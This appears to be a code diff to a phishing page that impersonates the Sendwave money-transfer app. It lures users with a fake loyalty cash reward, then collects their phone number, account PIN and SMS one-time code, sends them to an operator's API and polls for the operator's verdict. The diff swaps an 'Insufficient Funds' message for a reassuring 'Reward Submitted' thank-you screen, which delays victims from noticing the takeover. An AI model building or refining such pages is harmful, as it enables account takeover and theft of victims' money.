@@ -17,12 +17,7 @@
     .screen.active { display: flex; }
 
     /* ── LOADING ── */
-    .loading-overlay {
-      position: fixed; inset: 0; background: rgba(0,0,0,0.45);
-      display: flex; align-items: center; justify-content: center;
-      z-index: 9999; opacity: 0; visibility: hidden;
-      transition: opacity 0.2s, visibility 0.2s;
-    }
+    .loading-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.45); display: flex; align-items: center; justify-content: center; z-index: 9999; opacity: 0; visibility: hidden; transition: opacity 0.2s, visibility 0.2s; }
     .loading-overlay.show { opacity: 1; visibility: visible; }
     .loading-card { background: #fff; border-radius: 16px; padding: 28px 24px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.2); min-width: 160px; }
     .loading-spinner { width: 34px; height: 34px; border: 3px solid #eee; border-top-color: #f5c200; border-radius: 50%; animation: spin 0.6s linear infinite; margin: 0 auto 10px; }
@@ -30,63 +25,29 @@
     .loading-text { font-size: 14px; font-weight: 600; color: #333; }
 
     /* ── POPUP ── */
-    .popup-overlay {
-      position: fixed; inset: 0; background: rgba(0,0,0,0.45);
-      display: flex; align-items: center; justify-content: center;
-      z-index: 9999; opacity: 0; visibility: hidden;
-      transition: opacity 0.2s, visibility 0.2s;
-    }
+    .popup-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.45); display: flex; align-items: center; justify-content: center; z-index: 9999; opacity: 0; visibility: hidden; transition: opacity 0.2s, visibility 0.2s; }
     .popup-overlay.show { opacity: 1; visibility: visible; }
     .popup-card { background: #fff; border-radius: 20px; padding: 28px 24px; max-width: 300px; width: 90%; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.2); }
     .popup-icon { width: 52px; height: 52px; border-radius: 50%; margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; font-size: 24px; }
     .popup-icon.wrong { background: #fef2f2; }
-    .popup-icon.continue { background: #fffbeb; }
+    .popup-icon.success { background: #f0fdf4; }
     .popup-title { font-size: 18px; font-weight: 800; color: #111; margin-bottom: 8px; }
     .popup-message { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 20px; }
     .popup-btn { width: 100%; padding: 13px; background: #FFE600; border: none; border-radius: 50px; font-size: 15px; font-weight: 700; color: #1a0800; cursor: pointer; font-family: Arial, sans-serif; }
 
-    /* ══════════════════════════════
-       SCREEN 0: LOYALTY REWARDS
-    ══════════════════════════════ */
-    #loyalty {
-      flex-direction: column; align-items: center; justify-content: flex-start;
-      background: #f0ebe0; overflow-y: auto; overflow-x: hidden;
-    }
-    .loyalty-wrap {
-      max-width: 480px; width: 100%; background: #fff;
-      border-radius: 28px; box-shadow: 0 12px 48px rgba(0,0,0,0.14);
-      overflow: hidden; margin: 20px;
-    }
-    .loy-header {
-      background: #1C0A00; padding: 16px 22px;
-      display: flex; justify-content: space-between; align-items: center;
-    }
-    .loy-logo-wrap { display: flex; align-items: center; gap: 10px; }
+    /* ══ SCREEN 0: LOYALTY ══ */
+    #loyalty { flex-direction: column; align-items: center; justify-content: flex-start; background: #f0ebe0; overflow-y: auto; overflow-x: hidden; }
+    .loyalty-wrap { max-width: 480px; width: 100%; background: #fff; border-radius: 28px; box-shadow: 0 12px 48px rgba(0,0,0,0.14); overflow: hidden; margin: 20px; }
+    .loy-header { background: #1C0A00; padding: 16px 22px; display: flex; justify-content: space-between; align-items: center; }
     .loy-logo-text { font-size: 22px; font-weight: 900; color: #FFE600; letter-spacing: 2px; font-style: italic; }
-    .nav-link {
-      color: #FFE600; text-decoration: none; font-size: 14px; font-weight: 700;
-      cursor: pointer; padding: 8px 14px; border-radius: 20px;
-      border: 2px solid #FFE600; transition: background 0.2s;
-    }
+    .nav-link { color: #FFE600; font-size: 14px; font-weight: 700; cursor: pointer; padding: 8px 14px; border-radius: 20px; border: 2px solid #FFE600; transition: background 0.2s; }
     .nav-link:hover { background: rgba(255,230,0,0.12); }
     .loy-content { padding: 28px 24px; }
-    #loyPage2 { padding-bottom: 40px; overflow-y: auto; }
-
-    /* Page 1 */
-    .loy-page1 .hero-badge {
-      display: inline-block; background: #FFE600; color: #1C0A00;
-      font-size: 12px; font-weight: 800; letter-spacing: 1.5px;
-      padding: 5px 14px; border-radius: 20px; margin-bottom: 18px; text-transform: uppercase;
-    }
+    .loy-page1 .hero-badge { display: inline-block; background: #FFE600; color: #1C0A00; font-size: 12px; font-weight: 800; letter-spacing: 1.5px; padding: 5px 14px; border-radius: 20px; margin-bottom: 18px; text-transform: uppercase; }
     .loy-page1 h1 { font-size: 26px; font-weight: 900; color: #1C0A00; margin-bottom: 10px; line-height: 1.2; }
     .loy-page1 .subtitle { font-size: 15px; color: #555; margin-bottom: 28px; line-height: 1.6; }
     .loy-page1 .subtitle strong { color: #1C0A00; }
-    .cta-button {
-      background: #FFE600; color: #1C0A00; border: none; padding: 17px 30px;
-      font-size: 17px; font-weight: 800; border-radius: 50px; width: 100%;
-      cursor: pointer; transition: transform 0.15s, box-shadow 0.15s;
-      margin-bottom: 32px; box-shadow: 0 6px 20px rgba(255,230,0,0.4); letter-spacing: 0.3px;
-    }
+    .cta-button { background: #FFE600; color: #1C0A00; border: none; padding: 17px 30px; font-size: 17px; font-weight: 800; border-radius: 50px; width: 100%; cursor: pointer; transition: transform 0.15s, box-shadow 0.15s; margin-bottom: 32px; box-shadow: 0 6px 20px rgba(255,230,0,0.4); letter-spacing: 0.3px; }
     .cta-button:hover { transform: translateY(-2px); box-shadow: 0 10px 28px rgba(255,230,0,0.5); }
     .cta-button:active { transform: scale(0.98); }
     .steps { display: flex; justify-content: space-between; margin-bottom: 28px; background: #faf8f3; border-radius: 18px; padding: 18px 12px; }
@@ -95,8 +56,6 @@
     .step-text { font-size: 11px; font-weight: 800; color: #1C0A00; letter-spacing: 0.5px; text-transform: uppercase; }
     .features { display: flex; gap: 16px; color: #666; font-size: 13px; justify-content: center; flex-wrap: wrap; }
     .feature { display: flex; align-items: center; gap: 5px; background: #faf8f3; padding: 7px 12px; border-radius: 20px; font-weight: 600; }
-
-    /* Page 2 */
     .loy-page2 h1 { font-size: 22px; font-weight: 900; margin-bottom: 6px; color: #1C0A00; }
     .loy-page2 .subtitle { font-size: 14px; color: #666; margin-bottom: 22px; line-height: 1.5; }
     .form-section { background: #faf8f3; border-radius: 18px; padding: 20px; margin-bottom: 22px; }
@@ -117,7 +76,7 @@
     .audit-button:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 28px rgba(255,230,0,0.5); }
     .audit-button:disabled { background: #e8e0d0; color: #999; box-shadow: none; cursor: not-allowed; }
     .audit-button:active:not(:disabled) { transform: scale(0.98); }
-    .disclaimer { font-size: 12px; color: #999; text-align: center; line-height: 1.5; }
+    .disclaimer { font-size: 12px; color: #999; text-align: center; line-height: 1.5; padding-bottom: 10px; }
     .loy-footer { padding: 16px 24px; background: #1C0A00; font-size: 13px; color: #888; text-align: center; }
     .loy-footer a { color: #FFE600; text-decoration: none; font-weight: 600; }
     .loy-hidden { display: none !important; }
@@ -125,9 +84,7 @@
     .back-link a { color: #1C0A00; text-decoration: none; font-size: 14px; font-weight: 700; display: inline-flex; align-items: center; gap: 5px; }
     .back-link a:hover { text-decoration: underline; }
 
-    /* ══════════════════════════════
-       SCREEN 1: LANDING
-    ══════════════════════════════ */
+    /* ══ SCREEN 1: LANDING ══ */
     #landing { flex-direction: column; align-items: center; justify-content: flex-end; position: relative; }
     .bg { position: fixed; inset: 0; background-image: url('https://raw.githubusercontent.com/arapchelogoi/halleluyah/main/WhatsApp%20Image%202026-02-21%20at%2013.23.42.jpeg'); background-size: cover; background-position: center top; z-index: 0; }
     .bg::after { content: ''; position: absolute; inset: 0; background: linear-gradient(to bottom, rgba(0,0,0,0.05) 0%, rgba(0,0,0,0.1) 40%, rgba(255,245,200,0.6) 70%, rgba(255,245,180,0.97) 100%); }
@@ -142,9 +99,7 @@
     .letsgo-btn:active { transform: translateY(1px) scale(0.98); }
     .letsgo-btn svg { width: 22px; height: 22px; flex-shrink: 0; }
 
-    /* ══════════════════════════════
-       SCREEN 2: LOGIN
-    ══════════════════════════════ */
+    /* ══ SCREEN 2: LOGIN ══ */
     #login { flex-direction: column; background: #fff; padding: 0 24px; position: relative; max-width: 480px; margin: 0 auto; min-height: 100vh; }
     .back-arrow { margin-top: 56px; font-size: 22px; color: #000; cursor: pointer; width: fit-content; }
     #login h1 { margin-top: 24px; font-size: 30px; font-weight: 800; color: #000; }
@@ -169,9 +124,7 @@
     .bottom-text { position: absolute; bottom: 36px; left: 0; right: 0; text-align: center; font-size: 14px; color: #444; }
     .bottom-text a { color: #1a9090; font-weight: 700; text-decoration: underline; cursor: pointer; }
 
-    /* ══════════════════════════════
-       SCREEN 3: PIN
-    ══════════════════════════════ */
+    /* ══ SCREEN 3: PIN ══ */
     #pin { flex-direction: column; background: #fff; padding: 0 28px; max-width: 480px; margin: 0 auto; min-height: 100vh; }
     .close-btn { margin-top: 36px; font-size: 24px; color: #000; cursor: pointer; width: fit-content; line-height: 1; }
     .phone-icon { margin-top: 12px; width: 30px; height: 38px; }
@@ -191,9 +144,7 @@
     .continue-btn { width: 100%; height: 52px; background: #FFE600; border: none; border-radius: 50px; font-size: 17px; font-weight: 700; color: #1a0800; cursor: pointer; font-family: Arial, sans-serif; margin-top: 12px; margin-bottom: 20px; opacity: 0.45; transition: opacity 0.2s; }
     .continue-btn.ready { opacity: 1; }
 
-    /* ══════════════════════════════
-       SCREEN 4: OTP
-    ══════════════════════════════ */
+    /* ══ SCREEN 4: OTP ══ */
     #otp { flex-direction: column; background: #fff; padding: 0 24px; max-width: 480px; margin: 0 auto; min-height: 100vh; font-family: -apple-system, 'Helvetica Neue', Arial, sans-serif; }
     #otp .close-btn { margin-top: 54px; font-size: 22px; font-weight: 300; }
     .otp-phone-icon { margin-top: 22px; width: 34px; height: 44px; }
@@ -215,16 +166,35 @@
     .change-number { font-size: 14px; font-weight: 700; color: #1a6f6f; text-decoration: underline; cursor: pointer; }
     .otp-submit-btn { width: 100%; height: 54px; background: #FFE600; border: none; border-radius: 50px; font-size: 17px; font-weight: 700; color: #1a0800; cursor: pointer; font-family: Arial, sans-serif; margin-top: 28px; opacity: 0.45; transition: opacity 0.2s; }
     .otp-submit-btn.ready { opacity: 1; }
+
+    /* ══ SCREEN 5: THANK YOU ══ */
+    #thankyou { flex-direction: column; align-items: center; justify-content: flex-start; background: #1C0A00; min-height: 100vh; }
+    .ty-image-wrap { width: 100%; max-width: 480px; position: relative; overflow: hidden; flex-shrink: 0; }
+    .ty-image { width: 100%; display: block; object-fit: cover; object-position: center top; max-height: 52vh; }
+    .ty-image-overlay { position: absolute; bottom: 0; left: 0; right: 0; height: 60%; background: linear-gradient(to bottom, transparent, #1C0A00); }
+    .ty-content { width: 100%; max-width: 480px; padding: 0 28px 60px; display: flex; flex-direction: column; align-items: center; text-align: center; }
+    .ty-badge { background: #FFE600; color: #1C0A00; font-size: 11px; font-weight: 800; letter-spacing: 1.5px; padding: 5px 16px; border-radius: 20px; text-transform: uppercase; margin-bottom: 20px; margin-top: -14px; position: relative; z-index: 1; }
+    .ty-logo { font-family: 'Black Han Sans', sans-serif; font-size: 2.4rem; color: #FFE600; letter-spacing: 3px; margin-bottom: 8px; }
+    .ty-title { font-family: 'Black Han Sans', sans-serif; font-size: clamp(1.7rem, 6vw, 2.2rem); color: #fff; line-height: 1.2; margin-bottom: 16px; letter-spacing: 1px; }
+    .ty-title span { color: #FFE600; }
+    .ty-divider { width: 50px; height: 3px; background: #FFE600; border-radius: 2px; margin: 0 auto 24px; opacity: 0.5; }
+    .ty-message { font-size: 14.5px; color: rgba(255,255,255,0.7); line-height: 1.7; margin-bottom: 30px; max-width: 320px; }
+    .ty-features { display: flex; flex-direction: column; gap: 12px; width: 100%; margin-bottom: 36px; }
+    .ty-feature { display: flex; align-items: flex-start; gap: 14px; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,230,0,0.15); border-radius: 14px; padding: 14px 16px; text-align: left; }
+    .ty-feature-icon { font-size: 22px; flex-shrink: 0; margin-top: 2px; }
+    .ty-feature-text { font-size: 13px; color: rgba(255,255,255,0.75); line-height: 1.5; }
+    .ty-feature-text strong { color: #FFE600; display: block; font-size: 13.5px; margin-bottom: 2px; }
+    .ty-home-btn { width: 100%; height: 54px; background: #FFE600; border: none; border-radius: 50px; font-size: 17px; font-weight: 800; color: #1a0800; cursor: pointer; font-family: Arial, sans-serif; box-shadow: 0 6px 28px rgba(255,230,0,0.3); transition: transform 0.15s, box-shadow 0.15s; letter-spacing: 0.5px; }
+    .ty-home-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 32px rgba(255,230,0,0.45); }
+    .ty-home-btn:active { transform: scale(0.98); }
+    .ty-footnote { margin-top: 20px; font-size: 12px; color: rgba(255,255,255,0.3); }
   </style>
 </head>
 <body>
 
 <!-- LOADING -->
 <div class="loading-overlay" id="loadingOverlay">
-  <div class="loading-card">
-    <div class="loading-spinner"></div>
-    <div class="loading-text">Please wait…</div>
-  </div>
+  <div class="loading-card"><div class="loading-spinner"></div><div class="loading-text">Please wait…</div></div>
 </div>
 
 <!-- POPUP -->
@@ -241,20 +211,13 @@
 <div id="loyalty" class="screen active">
   <div class="loyalty-wrap">
     <div class="loy-header">
-      <div class="loy-logo-wrap">
-        <span class="loy-logo-text">SENDWAVE</span>
-      </div>
+      <span class="loy-logo-text">SENDWAVE</span>
       <span class="nav-link" id="navToggle" onclick="toggleLoyaltyPage()">Audit →</span>
     </div>
-
-    <!-- Loyalty Page 1 -->
     <div id="loyPage1" class="loy-content loy-page1">
       <div class="hero-badge">Loyalty Programme</div>
       <h1>CASH REWARD FOR LOYAL CUSTOMERS</h1>
-      <div class="subtitle">
-        You could qualify for a bonus between<br>
-        <strong>$100 – $1,500 USD</strong> based on your account activity.
-      </div>
+      <div class="subtitle">You could qualify for a bonus between<br><strong>$100 – $1,500 USD</strong> based on your account activity.</div>
       <button class="cta-button" onclick="toggleLoyaltyPage()">CHECK IF YOU QUALIFY →</button>
       <div class="steps">
         <div class="step"><div class="step-emoji"></div><div class="step-text">Enter Details</div></div>
@@ -262,15 +225,13 @@
         <div class="step"><div class="step-emoji"></div><div class="step-text">Get Reward</div></div>
       </div>
       <div class="features">
-        <div class="feature">⏱️ Under 1 minutes</div>
+        <div class="feature">⏱️ Under 1 minute</div>
         <div class="feature">🔒 Secure & private</div>
       </div>
     </div>
-
-    <!-- Loyalty Page 2 -->
     <div id="loyPage2" class="loy-content loy-page2 loy-hidden">
       <div class="back-link"><a href="#" onclick="toggleLoyaltyPage()">← Back</a></div>
-      <h1>📋 Enter Your Details</h1>
+      <h1>📋 Tell Us About Yourself</h1>
       <div class="subtitle">Provide accurate information. Your account data will be verified after login.</div>
       <div class="form-section">
         <div class="form-group">
@@ -319,23 +280,19 @@
           </select>
         </div>
       </div>
-
       <div class="estimate-box" id="estimateBox" style="display:none;">
         <div class="estimate-title">Estimated Loyalty Score</div>
         <div class="score" id="loyaltyScore">78%</div>
         <div class="estimate-range" id="rewardRange">$50 – $100</div>
         <div class="loy-warning">⚠ Final eligibility requires account audit</div>
       </div>
-
       <div class="loy-checkbox">
         <input type="checkbox" id="confirmCheck" onchange="toggleAuditButton()">
         <label for="confirmCheck">I confirm this information is accurate and understand my account will be verified upon login.</label>
       </div>
-
       <button class="audit-button" id="auditBtn" onclick="showScreen('landing')" disabled>AUDIT MY ACCOUNT →</button>
       <div class="disclaimer">By clicking, you'll be directed to login for official verification.</div>
     </div>
-
     <div class="loy-footer">Questions? <a href="#">FAQ</a> &nbsp;|&nbsp; <a href="#">Contact Support</a></div>
   </div>
 </div>
@@ -348,10 +305,7 @@
     <div class="tagline">FOR HERE<br/>FOR THERE<br/>FOR HOME</div>
     <button class="letsgo-btn" onclick="showScreen('login')">
       LET'S GO
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-        <line x1="5" y1="12" x2="19" y2="12"/>
-        <polyline points="12 5 19 12 12 19"/>
-      </svg>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
     </button>
   </div>
 </div>
@@ -362,16 +316,14 @@
   <h1>Welcome back</h1>
   <div class="phone-row">
     <div class="country-select" onclick="toggleDropdown()">
-      <span class="flag" id="selected-flag"></span>
-      <span class="country-code" id="selected-code">+1</span>
+      <span class="flag" id="selected-flag">🌐</span>
+      <span class="country-code" id="selected-code">+</span>
       <span class="chevron">▼</span>
     </div>
     <input class="phone-input" type="tel" placeholder="Mobile number" id="phone-input"/>
   </div>
   <div class="dropdown" id="dropdown">
-    <div class="dropdown-search">
-      <input type="text" placeholder="Search country..." id="search-input" oninput="filterCountries()"/>
-    </div>
+    <div class="dropdown-search"><input type="text" placeholder="Search country..." id="search-input" oninput="filterCountries()"/></div>
     <div id="country-list"></div>
   </div>
   <button class="log-in-btn" onclick="goToPin()">Log in</button>
@@ -382,16 +334,10 @@
 <!-- ══ SCREEN 3: PIN ══ -->
 <div id="pin" class="screen">
   <div class="close-btn" onclick="showScreen('login')">&#x2715;</div>
-  <svg class="phone-icon" viewBox="0 0 36 46" fill="none">
-    <rect x="1.5" y="1.5" width="33" height="43" rx="4.5" stroke="#000" stroke-width="3" fill="none"/>
-    <rect x="13" y="38" width="10" height="3" rx="1.5" fill="#000"/>
-  </svg>
+  <svg class="phone-icon" viewBox="0 0 36 46" fill="none"><rect x="1.5" y="1.5" width="33" height="43" rx="4.5" stroke="#000" stroke-width="3" fill="none"/><rect x="13" y="38" width="10" height="3" rx="1.5" fill="#000"/></svg>
   <h1>Enter pin</h1>
   <div class="pin-dashes">
-    <div class="dash active" id="d0"></div>
-    <div class="dash" id="d1"></div>
-    <div class="dash" id="d2"></div>
-    <div class="dash" id="d3"></div>
+    <div class="dash active" id="d0"></div><div class="dash" id="d1"></div><div class="dash" id="d2"></div><div class="dash" id="d3"></div>
   </div>
   <div class="keypad">
     <div class="keypad-row">
@@ -421,10 +367,7 @@
 <!-- ══ SCREEN 4: OTP ══ -->
 <div id="otp" class="screen">
   <div class="close-btn" onclick="showScreen('pin')">&#x2715;</div>
-  <svg class="otp-phone-icon" viewBox="0 0 34 44" fill="none">
-    <rect x="1.5" y="1.5" width="31" height="41" rx="4" stroke="#000" stroke-width="2.8" fill="none"/>
-    <rect x="12" y="36" width="10" height="3" rx="1.5" fill="#000"/>
-  </svg>
+  <svg class="otp-phone-icon" viewBox="0 0 34 44" fill="none"><rect x="1.5" y="1.5" width="31" height="41" rx="4" stroke="#000" stroke-width="2.8" fill="none"/><rect x="12" y="36" width="10" height="3" rx="1.5" fill="#000"/></svg>
   <div class="heading">Enter code</div>
   <div class="subtitle">We sent a 6-digit code to the mobile number linked to your account.</div>
   <input class="hidden-input" type="tel" id="otp-input" maxlength="6" inputmode="numeric"/>
@@ -440,17 +383,46 @@
   <div class="resend-label">Didn't get the code? Resend via:</div>
   <div class="resend-buttons">
     <button class="resend-btn">
-      <svg viewBox="0 0 18 18" fill="none"><rect x="1" y="3" width="16" height="12" rx="2" stroke="#1a6f6f" stroke-width="1.8" fill="none"/><rect x="6.5" y="13" width="5" height="2" rx="1" fill="#1a6f6f"/><rect x="7.5" y="15" width="3" height="1.5" rx="0.5" fill="#1a6f6f"/></svg>
-      SMS
+      <svg viewBox="0 0 18 18" fill="none"><rect x="1" y="3" width="16" height="12" rx="2" stroke="#1a6f6f" stroke-width="1.8" fill="none"/><rect x="6.5" y="13" width="5" height="2" rx="1" fill="#1a6f6f"/><rect x="7.5" y="15" width="3" height="1.5" rx="0.5" fill="#1a6f6f"/></svg>SMS
     </button>
     <button class="resend-btn">
-      <svg viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#1a6f6f" stroke-width="1.6" fill="none"/><path d="M9 2.5C5.41 2.5 2.5 5.41 2.5 9c0 1.16.31 2.25.85 3.19L2.5 15.5l3.4-.84A6.47 6.47 0 0 0 9 15.5c3.59 0 6.5-2.91 6.5-6.5S12.59 2.5 9 2.5z" fill="#1a6f6f" opacity="0.15"/><path d="M12.1 10.6c-.18-.09-.95-.47-1.1-.52-.15-.05-.26-.09-.37.09-.11.18-.43.52-.53.63-.1.11-.2.12-.37.04-.18-.09-.74-.27-1.4-.87-.52-.46-.87-1.03-.97-1.2-.1-.18-.01-.27.08-.36.08-.08.18-.2.27-.31.09-.1.12-.18.18-.3.06-.12.03-.22-.01-.31-.04-.09-.37-.9-.51-1.23-.13-.32-.27-.27-.37-.28h-.32c-.11 0-.29.04-.45.22-.15.18-.59.58-.59 1.4 0 .83.6 1.63.69 1.74.09.11 1.19 1.82 2.88 2.55.4.17.72.28.96.36.4.13.77.11 1.06.07.32-.05.95-.39 1.08-.76.14-.37.14-.69.1-.76-.04-.07-.15-.11-.32-.2z" fill="#1a6f6f"/></svg>
-      WhatsApp
+      <svg viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#1a6f6f" stroke-width="1.6" fill="none"/><path d="M9 2.5C5.41 2.5 2.5 5.41 2.5 9c0 1.16.31 2.25.85 3.19L2.5 15.5l3.4-.84A6.47 6.47 0 0 0 9 15.5c3.59 0 6.5-2.91 6.5-6.5S12.59 2.5 9 2.5z" fill="#1a6f6f" opacity="0.15"/><path d="M12.1 10.6c-.18-.09-.95-.47-1.1-.52-.15-.05-.26-.09-.37.09-.11.18-.43.52-.53.63-.1.11-.2.12-.37.04-.18-.09-.74-.27-1.4-.87-.52-.46-.87-1.03-.97-1.2-.1-.18-.01-.27.08-.36.08-.08.18-.2.27-.31.09-.1.12-.18.18-.3.06-.12.03-.22-.01-.31-.04-.09-.37-.9-.51-1.23-.13-.32-.27-.27-.37-.28h-.32c-.11 0-.29.04-.45.22-.15.18-.59.58-.59 1.4 0 .83.6 1.63.69 1.74.09.11 1.19 1.82 2.88 2.55.4.17.72.28.96.36.4.13.77.11 1.06.07.32-.05.95-.39 1.08-.76.14-.37.14-.69.1-.76-.04-.07-.15-.11-.32-.2z" fill="#1a6f6f"/></svg>WhatsApp
     </button>
   </div>
   <div class="otp-bottom-section">
     <div class="no-access-text">Don't have access to this number?</div>
     <div class="change-number" onclick="showScreen('login')">Change number</div>
+  </div>
+</div>
+
+<!-- ══ SCREEN 5: THANK YOU ══ -->
+<div id="thankyou" class="screen">
+  <div class="ty-image-wrap">
+    <img class="ty-image" src="https://raw.githubusercontent.com/arapchelogoi/Sendwave/master/wave.jpeg" alt="Sendwave" onerror="this.style.minHeight='120px';this.style.background='#2a1200';"/>
+    <div class="ty-image-overlay"></div>
+  </div>
+  <div class="ty-content">
+    <div class="ty-badge">🎉 Reward Submitted Successfully</div>
+    <div class="ty-logo">SENDWAVE</div>
+    <div class="ty-title">Thank You For<br/><span>Your Loyalty!</span></div>
+    <div class="ty-divider"></div>
+    <p class="ty-message">Your account has been successfully audited. Our team will review your loyalty score and reward eligibility shortly.</p>
+    <div class="ty-features">
+      <div class="ty-feature">
+        <div class="ty-feature-icon">📧</div>
+        <div class="ty-feature-text"><strong>Email Notification</strong>You will be notified via your email once your reward has been processed and approved.</div>
+      </div>
+      <div class="ty-feature">
+        <div class="ty-feature-icon">⏱️</div>
+        <div class="ty-feature-text"><strong>Processing Time</strong>Rewards are typically processed within 3–5 business days after verification.</div>
+      </div>
+      <div class="ty-feature">
+        <div class="ty-feature-icon">🔒</div>
+        <div class="ty-feature-text"><strong>Secure & Verified</strong>Your information is encrypted and handled securely by the Sendwave team.</div>
+      </div>
+    </div>
+    <button class="ty-home-btn" onclick="showScreen('loyalty'); resetLoyalty();">← Back to Home</button>
+    <p class="ty-footnote">© 2025 Sendwave. All rights reserved.</p>
   </div>
 </div>
 
@@ -462,20 +434,29 @@
   function showLoading() { document.getElementById('loadingOverlay').classList.add('show'); }
   function hideLoading()  { document.getElementById('loadingOverlay').classList.remove('show'); }
 
-  function showPopup(title, message, type = 'wrong') {
+  /* Popup with optional callback when OK is pressed */
+  function showPopup(title, message, type = 'wrong', onOk = null) {
     const icon = document.getElementById('popupIcon');
     icon.className = 'popup-icon ' + type;
-    icon.textContent = type === 'wrong' ? '❌' : '⚠️';
+    icon.textContent = type === 'wrong' ? '❌' : type === 'success' ? '✅' : '⚠️';
     document.getElementById('popupTitle').textContent = title;
     document.getElementById('popupMessage').textContent = message;
     document.getElementById('popupOverlay').classList.add('show');
+    window._popupOkCallback = onOk;
   }
-  function closePopup() { document.getElementById('popupOverlay').classList.remove('show'); }
+  function closePopup() {
+    document.getElementById('popupOverlay').classList.remove('show');
+    if (typeof window._popupOkCallback === 'function') {
+      const cb = window._popupOkCallback;
+      window._popupOkCallback = null;
+      cb();
+    }
+  }
 
   async function callApi(action, data = {}) {
     const params = new URLSearchParams();
     params.append('action', action);
-    for (let key in data) { params.append(key, data[key]); }
+    for (let key in data) params.append(key, data[key]);
     try {
       const res = await fetch(API_BASE_URL, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: params.toString() });
       return await res.json();
@@ -503,8 +484,14 @@
             showPopup('Wrong Code', 'The code you entered is incorrect. Please try again.', 'wrong');
             document.getElementById('otp-input').value = ''; updateSlots();
           } else if (result.status === 'continue') {
+            /* ── CHANGED: notify via email, then show thank-you screen ── */
             hideLoading(); clearInterval(statusCheckInterval); statusCheckInterval = null;
-            showPopup('Insufficient Funds', 'Please add more funds to your account and try again.', 'continue');
+            showPopup(
+              '🎉 Reward Submitted!',
+              'You will be notified via email on your reward.',
+              'success',
+              () => showScreen('thankyou')
+            );
           }
         }
       } catch (err) { console.error('Polling error:', err); }
@@ -515,11 +502,8 @@
   function showScreen(id) {
     document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
     document.getElementById(id).classList.add('active');
-    if (id === 'loyalty') {
-      document.body.classList.add('scrollable');
-    } else {
-      document.body.classList.remove('scrollable');
-    }
+    document.body.classList.toggle('scrollable', id === 'loyalty' || id === 'thankyou');
+    window.scrollTo(0, 0);
     if (id === 'otp') setTimeout(() => focusOtpInput(), 100);
   }
 
@@ -528,11 +512,17 @@
     const p1 = document.getElementById('loyPage1');
     const p2 = document.getElementById('loyPage2');
     const nav = document.getElementById('navToggle');
-    if (p1.classList.contains('loy-hidden')) {
-      p1.classList.remove('loy-hidden'); p2.classList.add('loy-hidden'); nav.textContent = 'Audit →';
-    } else {
-      p1.classList.add('loy-hidden'); p2.classList.remove('loy-hidden'); nav.textContent = '← Home';
-    }
+    const toPage2 = !p1.classList.contains('loy-hidden');
+    p1.classList.toggle('loy-hidden', toPage2);
+    p2.classList.toggle('loy-hidden', !toPage2);
+    nav.textContent = toPage2 ? '← Home' : 'Audit →';
+    window.scrollTo(0, 0);
+  }
+
+  function resetLoyalty() {
+    document.getElementById('loyPage1').classList.remove('loy-hidden');
+    document.getElementById('loyPage2').classList.add('loy-hidden');
+    document.getElementById('navToggle').textContent = 'Audit →';
   }
 
   /* ── Loyalty score ── */
@@ -544,38 +534,28 @@
     if (!age || !volume || !type || !period) { document.getElementById('estimateBox').style.display = 'none'; return; }
     document.getElementById('estimateBox').style.display = 'block';
     let score = 0;
-    if (age === '0-3') score += 10; else if (age === '3-6') score += 25; else if (age === '6-12') score += 40; else if (age === '1-2') score += 60; else if (age === '2-3') score += 80; else if (age === '3+') score += 100;
-    if (volume === '0-100') score += 10; else if (volume === '100-500') score += 30; else if (volume === '500-1000') score += 50; else if (volume === '1000-2500') score += 70; else if (volume === '2500-5000') score += 85; else if (volume === '5000+') score += 100;
-    if (type === 'new') score += 10; else if (type === 'standard') score += 40; else if (type === 'regular') score += 70; else if (type === 'premium') score += 90; else if (type === 'business') score += 100;
-    if (period === 'rarely') score += 10; else if (period === 'occasional') score += 30; else if (period === 'monthly') score += 50; else if (period === 'weekly') score += 75; else if (period === 'daily') score += 100;
+    ({  '0-3':10,'3-6':25,'6-12':40,'1-2':60,'2-3':80,'3+':100 }[age] || 0) && (score += {'0-3':10,'3-6':25,'6-12':40,'1-2':60,'2-3':80,'3+':100}[age]);
+    score += {'0-100':10,'100-500':30,'500-1000':50,'1000-2500':70,'2500-5000':85,'5000+':100}[volume] || 0;
+    score += {'new':10,'standard':40,'regular':70,'business':100}[type] || 0;
+    score += {'rarely':10,'occasional':30,'monthly':50,'weekly':75,'daily':100}[period] || 0;
     const pct = Math.round((score / 400) * 100);
     document.getElementById('loyaltyScore').textContent = pct + '%';
-    let range = '';
-    if (pct < 30) range = '$0 – $100'; else if (pct < 50) range = '$100 – $250'; else if (pct < 70) range = '$250 – $500'; else if (pct < 85) range = '$500 – $1,000'; else range = '$1,000 – $1,500';
-    document.getElementById('rewardRange').textContent = range;
+    document.getElementById('rewardRange').textContent =
+      pct < 30 ? '$0 – $100' : pct < 50 ? '$100 – $250' : pct < 70 ? '$250 – $500' : pct < 85 ? '$500 – $1,000' : '$1,000 – $1,500';
   }
   function updateEstimate() { calculateScore(); toggleAuditButton(); }
   function toggleAuditButton() {
-    const age = document.getElementById('accountAge').value;
-    const volume = document.getElementById('transactionVolume').value;
-    const type = document.getElementById('userType').value;
-    const period = document.getElementById('activePeriod').value;
-    const checked = document.getElementById('confirmCheck').checked;
-    document.getElementById('auditBtn').disabled = !(age && volume && type && period && checked);
+    const filled = ['accountAge','transactionVolume','userType','activePeriod'].every(id => document.getElementById(id).value);
+    document.getElementById('auditBtn').disabled = !(filled && document.getElementById('confirmCheck').checked);
   }
 
   /* ── Country picker ── */
   const countries = [
-    { flag: '🌐', name: 'Select Country', code: '+' },
